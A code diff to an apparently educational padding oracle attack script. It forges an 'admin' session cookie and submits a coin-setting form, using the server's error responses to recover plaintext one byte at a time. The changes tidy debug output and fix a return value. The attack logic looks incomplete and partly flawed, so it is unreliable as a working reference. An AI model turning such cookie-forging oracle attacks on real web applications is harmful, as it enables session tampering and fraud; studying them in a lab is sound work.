@@ -55,13 +55,6 @@ def po_attack_2blocks(po, ctx):
     print("C0 (len {}): {}".format(len(c0), c0))
     print("C1 (len {}): {}".format(len(c1), c1))
 
-    # Try just to get one padding correct
-    # test = C0 ^ 0x01 ^ 0x0i | C1 ?
-    # eest = c0[15] ^ 1 ^ 1
-    # print("test string: {}".format(str(test).encode('utf-8')))
-    # check_padding_response(str(test).encode('utf-8'))
-
-
     # TODO: Implement padding oracle attack for 2 blocks of messages.
 
     plaintext = bytearray(16)
@@ -71,7 +64,7 @@ def po_attack_2blocks(po, ctx):
             test[i] = val
             if check_padding_response(str(test).encode('utf-8')):
                 plaintext[i] = val ^ c0[i] ^ (16 - i)
-    return msg
+    return plaintext
 
 def po_attack(po, ctx):
     """
@@ -89,7 +82,7 @@ def is_response_ok(response):
     """
     error = int(response.text.find('error'))
     if error != -1:
-        print("Error Div found at index: {}".format(error))
+        #print("Error Div found at index: {}".format(error))
         return False
     return True
 
@@ -99,9 +92,8 @@ def check_padding_response(cookie):
     """
     sess.cookies.set("admin", None)
     sess.cookies.set("admin", cookie.hex())
-    print("Cookies after maul: {}".format(sess.cookies.get_dict()))
+    #print("Cookies after maul: {}".format(sess.cookies.get_dict()))
     result, response = do_setcoins_form(sess, uname, 5000)
-    print(response.text)
     
     return is_response_ok(response)
 
